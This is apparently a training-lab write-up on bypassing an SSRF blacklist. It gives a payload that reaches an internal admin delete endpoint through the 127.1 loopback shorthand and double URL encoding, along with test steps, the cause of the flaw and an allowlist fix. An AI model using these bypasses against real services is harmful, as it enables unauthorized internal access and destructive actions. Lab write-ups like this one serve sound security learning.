# Lab 3: SSRF with Blacklist Bypass
**Difficulty:** Practitioner
**Status:** ✅ Solved

## Vulnerability
Blacklist blocks 127.0.0.1, localhost, and "admin".
All three bypassed using alternative representations.

## Payload
stockApi=http://127.1/%2561dmin/delete?username=carlos

## Bypasses
- 127.0.0.1 → 127.1 (valid TCP/IP shorthand)
- "admin" → %2561dmin (double URL encoded)

## Steps
1. Tested 127.0.0.1 → blocked
2. Tested 127.1 → accepted!
3. Tested /admin → blocked
4. Double encoded 'a': a → %61 → %2561
5. Combined: http://127.1/%2561dmin/delete?username=carlos
6. Solved

## Why It Works
Blacklist checked BEFORE URL decoding.
Server decodes %2561 → %61 → a after check passes.
Blacklists can never cover all representations.

## Fix
Use whitelists not blacklists.
Reject everything not explicitly approved.
